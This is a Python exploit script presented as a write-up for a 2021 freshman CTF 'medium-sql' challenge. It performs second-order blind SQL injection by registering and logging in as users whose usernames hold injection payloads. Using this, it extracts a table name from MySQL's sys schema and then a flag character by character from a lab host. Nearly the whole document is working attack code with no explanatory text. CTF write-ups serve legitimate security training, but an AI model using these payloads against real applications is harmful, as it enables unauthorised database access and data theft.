'''
xpoint 2021新生赛 medium-sql write up
sql二次注入
'''
import requests
import hashlib
import random
import re
import string

url = 'http://192.168.224.128:18000/'


def register(username, cookie):
    data = {"username": username, "email": "1@qq.com", "password": "123456", "confirm": "123456"}
    r = requests.post(url=url + '/register.php', data=data, cookies={"PHPSESSID": cookie})
    # print(r.text)


def login(username, cookie):
    data = {"username": username, "email": "1@qq.com", "password": "123456", "confirm": "123456"}
    r = requests.post(url=url + '/login.php', data=data, cookies={"PHPSESSID": cookie})
    # print(r.text)


def logout(cookie):
    requests.get(url=url + 'logout.php', cookies={"PHPSESSID": cookie})


def index(cookie):
    r = requests.get(url=url + 'index.php', cookies={"PHPSESSID": cookie})
    rule = r'<div class="container"><table class="table"><thead><tr><th scope="col">#</th><th scope="col">Email</th><th scope="col">Time</th></tr></thead><tbody>(.+?)</tbody></table></div>'
    # print(r.text)
    result = re.findall(rule, r.text)
    try:
        if "1@qq.com" in result[0]:
            return True
        else:
            return False
    except IndexError:
        return False


def get_table_name():
    for i in range(1, 50):
        for j in string.ascii_lowercase + string.digits + '{,}':
            cookie = hashlib.md5(str(random.random()).encode('utf-8')).hexdigest()
            payload = "%s'||(mid((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where((table_schema)like(0x6d656469756d))),%d,1)like('%s'))||'" % (
                hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)
            register(payload, cookie)
            login(payload, cookie)
            if index(cookie):
                print(j, end='')
                break
            logout(cookie)


def get_flag():
    for i in range(1, 50):
        for j in string.ascii_lowercase + string.digits + '{,}':
            cookie = hashlib.md5(str(random.random()).encode('utf-8')).hexdigest()
            payload = "%s'||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)like('%s'))||'" % (
                hashlib.md5(str(random.random()).encode('utf-8')).hexdigest(), i, j)
            register(payload, cookie)
            login(payload, cookie)
            if index(cookie):
                print(j, end='')
                break
            logout(cookie)


get_table_name()
get_flag()
